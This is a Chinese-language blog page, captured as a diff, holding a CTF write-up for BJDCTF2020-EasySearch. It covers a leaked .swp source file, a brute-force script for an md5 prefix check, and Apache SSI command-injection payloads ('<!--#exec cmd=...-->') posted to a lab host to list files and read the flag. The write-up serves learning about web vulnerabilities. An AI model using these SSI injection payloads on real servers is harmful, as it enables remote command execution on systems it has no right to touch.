+           href="/2025/01/29/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/"
+           data-tag="学习笔记,命令执行"
+           data-author="" >
+            <span class="post-title" title="命令执行">命令执行</span>
+            <span class="post-date" title="2025-01-29 22:54:38">2025/01/29</span>
+        </a>
+        
+        
+        <a  class="All "
+           href="/2025/01/29/ctfshow-web82/"
+           data-tag="文件包含,做题笔记"
+           data-author="" >
+            <span class="post-title" title="ctfshow-web82">ctfshow-web82</span>
+            <span class="post-date" title="2025-01-29 04:36:22">2025/01/29</span>
+        </a>
+        
+        
+        <a  class="All "
+           href="/2025/01/29/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/"
+           data-tag="文件包含,学习笔记"
+           data-author="" >
+            <span class="post-title" title="文件包含漏洞总结">文件包含漏洞总结</span>
+            <span class="post-date" title="2025-01-29 02:22:55">2025/01/29</span>
+        </a>
+        
+        
+        <a  class="All "
+           href="/2025/01/26/ctfshow-web160/"
+           data-tag="做题笔记,文件上传,日志包含"
+           data-author="" >
+            <span class="post-title" title="[ctfshow]web160">[ctfshow]web160</span>
+            <span class="post-date" title="2025-01-26 16:37:35">2025/01/26</span>
+        </a>
+        
+        
+        <a  class="All "
+           href="/2025/01/26/buuctf%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98upload/"
+           data-tag="做题笔记,文件上传"
+           data-author="" >
+            <span class="post-title" title="buuctf极客大挑战upload">buuctf极客大挑战upload</span>
+            <span class="post-date" title="2025-01-26 16:36:39">2025/01/26</span>
+        </a>
+        
+        
+        <a  class="All "
+           href="/2025/01/22/upload/"
+           data-tag="学习笔记,文件上传"
+           data-author="" >
+            <span class="post-title" title="upload">upload</span>
+            <span class="post-date" title="2025-01-22 15:22:47">2025/01/22</span>
+        </a>
+        
+        
+        <a  class="All "
+           href="/2025/01/19/python%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"
+           data-tag="学习笔记,python"
+           data-author="" >
+            <span class="post-title" title="python学习笔记">python学习笔记</span>
+            <span class="post-date" title="2025-01-19 01:39:35">2025/01/19</span>
+        </a>
+        
+        
+        <a  class="All "
+           href="/2025/01/09/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982019Http/"
+           data-tag="刷题笔记,http协议"
+           data-author="" >
+            <span class="post-title" title="极客大挑战2019Http">极客大挑战2019Http</span>
+            <span class="post-date" title="2025-01-09 16:47:44">2025/01/09</span>
+        </a>
+        
+        
+        <a  class="All "
+           href="/2025/01/09/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982019SecretFile/"
+           data-tag="刷题笔记,filter伪协议"
+           data-author="" >
+            <span class="post-title" title="极客大挑战2019SecretFile">极客大挑战2019SecretFile</span>
+            <span class="post-date" title="2025-01-09 01:36:08">2025/01/09</span>
+        </a>
+        
+        
+        <a  class="All "
+           href="/2025/01/05/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982019LoveSQL/"
+           data-tag="刷题笔记,sql注入"
+           data-author="" >
+            <span class="post-title" title="极客大挑战2019LoveSQL">极客大挑战2019LoveSQL</span>
+            <span class="post-date" title="2025-01-05 20:00:42">2025/01/05</span>
+        </a>
+        
+        
+        <a  class="All "
+           href="/2025/01/05/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982019Havefun/"
+           data-tag="刷题笔记,payload构造"
+           data-author="" >
+            <span class="post-title" title="极客大挑战2019Havefun">极客大挑战2019Havefun</span>
+            <span class="post-date" title="2025-01-05 19:35:48">2025/01/05</span>
+        </a>
+        
+        
+        <a  class="All "
+           href="/2025/01/05/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982019EasySQL/"
+           data-tag="刷题笔记,sql注入"
+           data-author="" >
+            <span class="post-title" title="极客大挑战2019EasySQL">极客大挑战2019EasySQL</span>
+            <span class="post-date" title="2025-01-05 19:10:32">2025/01/05</span>
+        </a>
+        
+        
+        <a  class="All "
+           href="/2025/01/03/sql%E6%B3%A8%E5%85%A5/"
+           data-tag="学习笔记,sql注入"
+           data-author="" >
+            <span class="post-title" title="sql注入">sql注入</span>
+            <span class="post-date" title="2025-01-03 21:14:16">2025/01/03</span>
+        </a>
+        
+        
+        <a  class="All "
+           href="/2024/12/29/MySQL/"
+           data-tag="学习笔记,MySQL"
+           data-author="" >
+            <span class="post-title" title="MySQL">MySQL</span>
+            <span class="post-date" title="2024-12-29 19:30:51">2024/12/29</span>
+        </a>
+        
+        
+        <a  class="All "
+           href="/2024/12/28/php%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F%E7%AC%94%E8%AE%B0/"
+           data-tag="学习笔记,正则表达式"
+           data-author="" >
+            <span class="post-title" title="正则表达式笔记">正则表达式笔记</span>
+            <span class="post-date" title="2024-12-28 20:46:55">2024/12/28</span>
+        </a>
+        
+        
+        <a  class="All "
+           href="/2024/12/26/PHP%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"
+           data-tag="学习笔记,php"
+           data-author="" >
+            <span class="post-title" title="PHP学习笔记">PHP学习笔记</span>
+            <span class="post-date" title="2024-12-26 23:50:15">2024/12/26</span>
+        </a>
+        
+        
+        <a  class="All "
+           href="/2024/12/25/HTML%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"
+           data-tag="学习笔记,HTML"
+           data-author="" >
+            <span class="post-title" title="HTML学习笔记">HTML学习笔记</span>
+            <span class="post-date" title="2024-12-25 23:54:00">2024/12/25</span>
+        </a>
+        
+        
+        <a  class="All "
+           href="/2024/12/25/welcome/"
+           data-tag=""
+           data-author="" >
+            <span class="post-title" title="welcome">welcome</span>
+            <span class="post-date" title="2024-12-25 20:38:33">2024/12/25</span>
+        </a>
+        
+        <div id="no-item-tips">
+
+        </div>
+    </nav>
+    <div id="outline-list">
+    </div>
+</div>
+
+    </div>
+    <div class="hide-list">
+        <div class="semicircle" data-title="Toggle full screen shortcut key s">
+            <div class="brackets first"><</div>
+            <div class="brackets">&gt;</div>
+        </div>
+    </div>
+</aside>
+<div id="post">
+    <div class="pjax">
+        <article id="post-BJDCTF2020-EasySearch1" class="article article-type-post" itemscope itemprop="blogPost">
+    
+        <h1 class="article-title">BJDCTF2020-EasySearch1</h1>
+    
+    <div class="article-meta">
+        
+        
+        
+        
+        <span class="tag">
+            <i class="iconfont icon-tag"></i>
+            
+            <a class="color1">swp泄露</a>
+            
+            <a class="color1">md5碰撞</a>
+            
+            <a class="color5">代码审计</a>
+            
+            <a class="color5">Apache SSI 远程命令执行漏洞</a>
+            
+        </span>
+        
+    </div>
+    <div class="article-meta">
+        
+            Created At : <time class="date" title='Updated At: 2025-03-30 14:51:44'>2025-03-30 14:24</time>
+        
+    </div>
+    <div class="article-meta">
+        
+        <span>Count:1.4k</span>
+        
+        
+        <span id="busuanzi_container_page_pv">
+            Views 👀 :<span id="busuanzi_value_page_pv">
+                <span class="count-comment">
+                    <span class="spinner">
+                      <div class="cube1"></div>
+                      <div class="cube2"></div>
+                    </span>
+                </span>
+            </span>
+        </span>
+        
+        
+        <span class="top-comment" title="Jump to comment area">
+            <a href="#comments">
+                Comment:<span class="count-comment">
+                    <span class="spinner">
+                      <div class="cube1"></div>
+                      <div class="cube2"></div>
+                    </span>
+                </span>
+            </a>
+        </span>
+        
+    </div>
+    
+    <div class="toc-ref">
+    
+        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#BJDCTF2020-EasySearch1"><span class="toc-text">BJDCTF2020-EasySearch1</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%9F%A5%E8%AF%86%E7%82%B9"><span class="toc-text">知识点</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#swp%E6%B3%84%E9%9C%B2"><span class="toc-text">swp泄露</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#md5%E7%A2%B0%E6%92%9E"><span class="toc-text">md5碰撞</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Apache-SSI-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E"><span class="toc-text">Apache SSI 远程命令执行漏洞</span></a></li></ol></li></ol></li></ol>
+    
+<style>
+    .left-col .switch-btn,
+    .left-col .switch-area {
+        display: none;
+    }
+    .toc-level-3 i,
+    .toc-level-3 ol {
+        display: none !important;
+    }
+</style>
+</div>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h1 id="BJDCTF2020-EasySearch1"><a href="#BJDCTF2020-EasySearch1" class="headerlink" title="BJDCTF2020-EasySearch1"></a>BJDCTF2020-EasySearch1</h1><p>一进来发现是这样一个页面。</p>
+<p><img src="/../image/BJDCTF2020-EasySearch1-1.png"></p>
+<p>尝试sql注入，发现没反应，用dirsearch扫一下目录发现是swp泄露</p>
+<p>访问url&#x2F;index.php.swp</p>
+<p>发现源码，开始代码审计</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>	<span class="hljs-title function_ invoke__">ob_start</span>();<br>	<span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">get_hash</span>(<span class="hljs-params"></span>)</span>&#123;<br>		<span class="hljs-variable">$chars</span> = <span class="hljs-string">&#x27;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789!@#$%^&amp;*()+-&#x27;</span>;<br>		<span class="hljs-variable">$random</span> = <span class="hljs-variable">$chars</span>[<span class="hljs-title function_ invoke__">mt_rand</span>(<span class="hljs-number">0</span>,<span class="hljs-number">73</span>)].<span class="hljs-variable">$chars</span>[<span class="hljs-title function_ invoke__">mt_rand</span>(<span class="hljs-number">0</span>,<span class="hljs-number">73</span>)].<span class="hljs-variable">$chars</span>[<span class="hljs-title function_ invoke__">mt_rand</span>(<span class="hljs-number">0</span>,<span class="hljs-number">73</span>)].<span class="hljs-variable">$chars</span>[<span class="hljs-title function_ invoke__">mt_rand</span>(<span class="hljs-number">0</span>,<span class="hljs-number">73</span>)].<span class="hljs-variable">$chars</span>[<span class="hljs-title function_ invoke__">mt_rand</span>(<span class="hljs-number">0</span>,<span class="hljs-number">73</span>)];<span class="hljs-comment">//Random 5 times</span><br>		<span class="hljs-variable">$content</span> = <span class="hljs-title function_ invoke__">uniqid</span>().<span class="hljs-variable">$random</span>;<br>		<span class="hljs-keyword">return</span> <span class="hljs-title function_ invoke__">sha1</span>(<span class="hljs-variable">$content</span>); <br>	&#125;<br> <br>    <span class="hljs-comment">// 设置响应的Content-Type头部信息为text/html，并指定字符编码为utf-8</span><br>    <span class="hljs-title function_ invoke__">header</span>(<span class="hljs-string">&quot;Content-Type: text/html;charset=utf-8&quot;</span>);<br> <br>    <span class="hljs-comment">//检查用户是否提交了表单且username字段不为空</span><br>    <span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;username&#x27;</span>]) <span class="hljs-keyword">and</span> <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;username&#x27;</span>] != <span class="hljs-string">&#x27;&#x27;</span> )<br>    &#123;<br>        <span class="hljs-variable">$admin</span> = <span class="hljs-string">&#x27;6d0bc1&#x27;</span>;<br>        <br>        <span class="hljs-comment">// 验证用户密码是否匹配管理员密码</span><br>        <span class="hljs-keyword">if</span> ( <span class="hljs-variable">$admin</span> == <span class="hljs-title function_ invoke__">substr</span>(<span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;password&#x27;</span>]),<span class="hljs-number">0</span>,<span class="hljs-number">6</span>)) &#123;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;script&gt;alert(&#x27;[+] Welcome to manage system&#x27;)&lt;/script&gt;&quot;</span>; <span class="hljs-comment">// 输出欢迎消息</span><br>            <span class="hljs-comment">// 创建一个以生成的哈希值为文件名的.shtml文件</span><br>            <span class="hljs-variable">$file_shtml</span> = <span class="hljs-string">&quot;public/&quot;</span>.<span class="hljs-title function_ invoke__">get_hash</span>().<span class="hljs-string">&quot;.shtml&quot;</span>;<br>            <span class="hljs-comment">// 打开文件用于写入，如果打开失败则输出错误信息并终止脚本执行</span><br>            <span class="hljs-variable">$shtml</span> = <span class="hljs-title function_ invoke__">fopen</span>(<span class="hljs-variable">$file_shtml</span>, <span class="hljs-string">&quot;w&quot;</span>) <span class="hljs-keyword">or</span> <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;Unable to open file!&quot;</span>);<br>            <span class="hljs-variable">$text</span> = <span class="hljs-string">&#x27;</span><br><span class="hljs-string">            ***</span><br><span class="hljs-string">            ***</span><br><span class="hljs-string">            &lt;h1&gt;Hello,&#x27;</span>.<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;username&#x27;</span>].<span class="hljs-string">&#x27;&lt;/h1&gt;</span><br><span class="hljs-string">            ***</span><br><span class="hljs-string">			***&#x27;</span>; <span class="hljs-comment">// 组装要写入文件的内容</span><br>            <span class="hljs-comment">// 将内容写入文件</span><br>            <span class="hljs-title function_ invoke__">fwrite</span>(<span class="hljs-variable">$shtml</span>,<span class="hljs-variable">$text</span>);<br>            <span class="hljs-comment">// 关闭文件</span><br>            <span class="hljs-title function_ invoke__">fclose</span>(<span class="hljs-variable">$shtml</span>);<br>            ***<br>			<span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;[!] Header  error ...&quot;</span>; <span class="hljs-comment">// 输出错误消息</span><br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;script&gt;alert(&#x27;[!] Failed&#x27;)&lt;/script&gt;&quot;</span>; <span class="hljs-comment">// 输出验证失败消息</span><br>        &#125;<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-comment">// 如果用户名为空，则执行此部分逻辑</span><br>		***<br>    &#125;<br>	***<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>
+
+<p>意思就是他会检查传入的password的值，如果password的md5值的前6位等于”6d0bc1”那就就会执行命令将输入的username写入到一个随机数生成的shtml文件中，并输入header error 的错误信息。</p>
+<p>所以我们首先要做的就是要使password符合要求，可以用这两个脚本来找出符合要求的password.</p>
+<p><strong>php</strong></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-variable">$admin</span> = <span class="hljs-string">&#x27;6d0bc1&#x27;</span>;<br><br><span class="hljs-keyword">for</span>(<span class="hljs-variable">$i</span>=<span class="hljs-number">0</span>;<span class="hljs-variable">$i</span>&lt;=<span class="hljs-number">10000000000000</span>;<span class="hljs-variable">$i</span>++)<br>&#123;<br>    <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">substr</span>(<span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$i</span>),<span class="hljs-number">0</span>,<span class="hljs-number">6</span>)===<span class="hljs-variable">$admin</span>)<br>    &#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-variable">$i</span>.PHP_EOL;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p><strong>python</strong></p>
+<figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs stylus">from hashlib import md5<br> <br><span class="hljs-keyword">for</span> <span class="hljs-selector-tag">i</span> <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">10000000</span>):<br>    <span class="hljs-keyword">if</span> <span class="hljs-built_in">md5</span>(<span class="hljs-built_in">str</span>(i)<span class="hljs-selector-class">.encode</span>(<span class="hljs-string">&#x27;utf-8&#x27;</span>))<span class="hljs-selector-class">.hexdigest</span>()<span class="hljs-selector-attr">[:6]</span> == <span class="hljs-string">&#x27;6d0bc1&#x27;</span>:<br>        <span class="hljs-built_in">print</span>(i)<br></code></pre></td></tr></table></figure>
+
+<p>得到很多结果，随便用一个都行</p>
+<p><img src="/../image/BJDCTF2020-EasySearch1-2.png"></p>
+<p>绕过md5后，我们继续分析~</p>
+<p>绕过md5后，他将我们传入的username写入到了shtml文件里面.</p>
+<p>意思就是 username是个注入点，我们可以控制username的内容来实现远程代码执行漏洞.</p>
+<p>而username的格式是<code>&lt;!--#exec cmd=”id” --&gt;.</code></p>
+<hr>
+<p>那么让我们开始构造payload，查看一下目录下的文件</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs xml">http://eaa2ba87-d2ea-4326-9975-cd0555e9672c.node5.buuoj.cn:81/index.php<br><br>POST：<br>username=<span class="hljs-comment">&lt;!--#exec cmd=&quot;ls ../&quot;--&gt;</span>&amp;password=2020666<br></code></pre></td></tr></table></figure>
+
+<p>这里显示[!] Header error .</p>
+<p><img src="/../image/BJDCTF2020-EasySearch1-3.png"></p>
+<p>按F12在网络中找到index.php的标头</p>
+<p><img src="/../image/BJDCTF2020-EasySearch1-4.png"></p>
+<p>发现了我们写入的shtml文件的位置，去访问一下. </p>
+<p><img src="/../image/BJDCTF2020-EasySearch1-5.png"></p>
+<p>可以看到flag，文件，重新写一个命令，来读取flag</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs xml">http://eaa2ba87-d2ea-4326-9975-cd0555e9672c.node5.buuoj.cn:81/index.php<br><br>POST：<br>username=<span class="hljs-comment">&lt;!--#exec cmd=&quot;cat ../flag_990c66bf85a09c664f0b6741840499b2&quot;--&gt;</span>&amp;password=2020666<br></code></pre></td></tr></table></figure>
+
+<p>拿到flag</p>
+<p><img src="/../image/BJDCTF2020-EasySearch1-6.png"></p>
+<hr>
+<h2 id="知识点"><a href="#知识点" class="headerlink" title="知识点"></a>知识点</h2><h3 id="swp泄露"><a href="#swp泄露" class="headerlink" title="swp泄露"></a>swp泄露</h3><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus">SWP文件泄露漏洞是指在使用 Vim编辑器 编辑一个文件时，Vim会在同一目录下创建一个以<span class="hljs-string">&quot;.swp&quot;</span>结尾的临时文件来保存编辑过程中的变化，如果在编辑过程中Vim进程被意外终止或者用户没有正确地退出Vim，那么这个临时文件可能会被留下来，如果攻击者能够访问这个临时文件就可以获得原始文件的敏感信息，从而导致信息泄露，需要注意的是不同的操作失败次数将会导致产生不同后缀的交互文件，例如:index.php第一次产生的交换文件名为<span class="hljs-selector-class">.index</span><span class="hljs-selector-class">.php</span>.swp，再次意外退出后将会产生名为<span class="hljs-selector-class">.index</span><span class="hljs-selector-class">.php</span>.swo的交换文件，第三次产生的交换文件则为<span class="hljs-selector-class">.index</span><span class="hljs-selector-class">.php</span><span class="hljs-selector-class">.swn</span> <br></code></pre></td></tr></table></figure>
+
+<hr>
+<h3 id="md5碰撞"><a href="#md5碰撞" class="headerlink" title="md5碰撞"></a>md5碰撞</h3><p>有时候我们可以通过爆破数字的md5值来实现md5碰撞</p>
+<p>比如：</p>
+<figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs stylus">from hashlib import md5<br> <br><span class="hljs-keyword">for</span> <span class="hljs-selector-tag">i</span> <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">10000000</span>):<br>    <span class="hljs-keyword">if</span> <span class="hljs-built_in">md5</span>(<span class="hljs-built_in">str</span>(i)<span class="hljs-selector-class">.encode</span>(<span class="hljs-string">&#x27;utf-8&#x27;</span>))<span class="hljs-selector-class">.hexdigest</span>()<span class="hljs-selector-attr">[:6]</span> == <span class="hljs-string">&#x27;6d0bc1&#x27;</span>:<br>        <span class="hljs-built_in">print</span>(i)<br></code></pre></td></tr></table></figure>
+
+<hr>
+<h3 id="Apache-SSI-远程命令执行漏洞"><a href="#Apache-SSI-远程命令执行漏洞" class="headerlink" title="Apache SSI 远程命令执行漏洞"></a>Apache SSI 远程命令执行漏洞</h3><p><a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_45521281/article/details/107576959">详解</a></p>
+<p>知识点：</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs xml">SSI 服务器端包含<br>SSI（server-side includes）能帮我们实现什么功能：<br>SSI提供了一种对现有HTML文档增加动态内容的方法，即在html中加入动态内容。<br><br>SSI是嵌入HTML页面中的指令，在页面被提供时由服务器进行运算，以对现有HTML页面增加动态生成的内容，而无须通过CGI程序提供其整个页面，或者使用其他动态技术。<br><br>从技术角度上来说，SSI就是在HTML文件中，可以通过注释行调用的命令或指针，即允许通过在HTML页面注入脚本或远程执行任意命令。<br><br>在测试任意文件上传漏洞的时候，目标服务端可能不允许上传php后缀的文件。如果目标服务器开启了SSI与CGI支持，我们可以上传一个shtml文件，并利用<span class="hljs-comment">&lt;!--#exec cmd=&quot;ls /&quot; --&gt;</span>语法执行任意命令。<br><br>Apache SSI 远程命令执行漏洞<br>当目标服务器开启了SSI与CGI支持，我们就可以上传shtml，利用<span class="hljs-comment">&lt;!--#exec cmd=&quot;ls /&quot; --&gt;</span>语法来执行命令。<br><br>使用SSI(Server Side Include)的html文件扩展名，SSI（Server Side Include)，通常称为&quot;服务器端嵌入&quot;或者叫&quot;服务器端包含&quot;，是一种类似于ASP的基于服务器的网页制作技术。默认扩展名是 .stm、.shtm 和 .shtml。<br></code></pre></td></tr></table></figure>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+      
+       <hr><span style="font-style: italic;color: gray;"> 转载请注明来源，欢迎对文章中的引用来源进行考证，欢迎指出任何有错误或不够清晰的表达。 </span>
+    </div>
+</article>
+
+
+
+
+
+    <div id="comments">
+    <script>
+        {
+            const comments = document.getElementById("comments");
+            const script = document.createElement("script");
+            script.src = "https://giscus.app/client.js";
+            script.setAttribute('data-repo', "MIXBP/MIXBP.github.io");
+            script.setAttribute('data-repo-id', "R_kgDONYaZsg");
+            script.setAttribute('data-category', "Announcements");
+            script.setAttribute('data-category-id', "DIC_kwDONYaZss4ClAnT");
+            script.setAttribute('data-mapping', "pathname");
+            script.setAttribute('data-strict', "0");
+            script.setAttribute('data-reactions-enabled', "1");
+            script.setAttribute('data-emit-metadata', "0");
+            script.setAttribute('data-input-position', "top");
+            script.setAttribute('data-theme', "noborder_dark");
+            script.setAttribute('data-lang', "zh-CN");
+            script.setAttribute('data-loading', "lazy");
+            script.setAttribute('crossorigin', "anonymous");
+            script.setAttribute('async', "");
+            comments.appendChild(script);
+        }
+    </script>
+</div>
+
+
+
+    
+
+
+
+
+    </div>
+    <div class="copyright">
+        <p class="footer-entry">
+    ©MIXBP 2024
+</p>
+<p class="footer-entry">Built with <a href="https://hexo.io/" target="_blank">Hexo</a> and <a href="https://github.com/yelog/hexo-theme-3-hexo" target="_blank">3-hexo</a> theme</p>
+
+    </div>
+    <div class="full-toc">
+        <button class="full" data-title="Toggle full screen shortcut key s"><span class="min "></span></button>
+<a class="" id="rocket" ></a>
+
+    </div>
+</div>
+
+</body>
+<script src="/js/jquery.pjax.js?v=1.1.0" ></script>
+
+<script src="/js/script.js?v=1.1.0" ></script>
+<script>
+    var img_resize = 'default';
+    function initArticle() {
+        /*渲染对应的表格样式*/
+        
+            $("#post .pjax table").addClass("green_title");
+        
+
+        /*渲染打赏样式*/
+        
+
+        /*高亮代码块行号*/
+        
+
+        /*访问数量*/
+        
+        $.getScript("//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js");
+        
+
+        /*代码高亮，行号对齐*/
+        $('.pre-numbering').css('line-height',$('.has-numbering').css('line-height'));
+
+        
+        
+    }
+
+    /*打赏页面隐藏与展示*/
+    
+
+</script>
+
+<!--加入行号的高亮代码块样式-->
+
+<!--自定义样式设置-->
+<style>
+    
+    
+    .nav {
+        width: 542px;
+    }
+    .nav.fullscreen {
+        margin-left: -542px;
+    }
+    .nav-left {
+        width: 120px;
+    }
+    
+    
+    @media screen and (max-width: 1468px) {
+        .nav {
+            width: 492px;
+        }
+        .nav.fullscreen {
+            margin-left: -492px;
+        }
+        .nav-left {
+            width: 100px;
+        }
+    }
+    
+    
+    @media screen and (max-width: 1024px) {
+        .nav {
+            width: 492px;
+            margin-left: -492px
+        }
+        .nav.fullscreen {
+            margin-left: 0;
+        }
+    }
+    
+    @media screen and (max-width: 426px) {
+        .nav {
+            width: 100%;
+        }
+        .nav-left {
+            width: 100%;
+        }
+    }
+    
+    
+    .nav-right .title-list nav a .post-title, .nav-right .title-list #local-search-result a .post-title {
+        color: #383636;
+    }
+    
+    
+    .nav-right .title-list nav a .post-date, .nav-right .title-list #local-search-result a .post-date {
+        color: #5e5e5f;
+    }
+    
+    
+    .nav-right nav a.hover, #local-search-result a.hover{
+        background-color: #e2e0e0;
+    }
+    
+    
+
+    /*列表样式*/
+    
+
+    /* 背景图样式 */
+    
+    #post {
+        background: url(/img/background.jpg);
+    }
+    
+    
+    #post .index {
+        background: url(/img/background2.jpg);
+    }
+    
+
+
+    /*引用块样式*/
+    
+
+    /*文章列表背景图*/
+    
+    .nav-right:before {
+        content: ' ';
+        display: block;
+        position: absolute;
+        left: 0;
+        top: 0;
+        width: 100%;
+        height: 100%;
+        opacity: 0.5;
+        background: url("/img/bjtp.jpg");
+        background-repeat: no-repeat;
+        background-position: 50% 0;
+        -ms-background-size: cover;
+        -o-background-size: cover;
+        -moz-background-size: cover;
+        -webkit-background-size: cover;
+        background-size: cover;
+    }
+    
+
+    
+</style>
+
+
+
+
+
+
+<div class="mobile-menus-out" >
+
+</div>
+<div class="mobile-menus">
+    
+    
+    
+    <a class="dynamic-menu " target="_self"   href="https://mixbp.github.io/">MIXBP</a>
+    
+    
+    <a class="dynamic-menu " target="_blank"  href="https://mixbp.github.io/">github</a>
+    
+</div>
+
+
+</html>
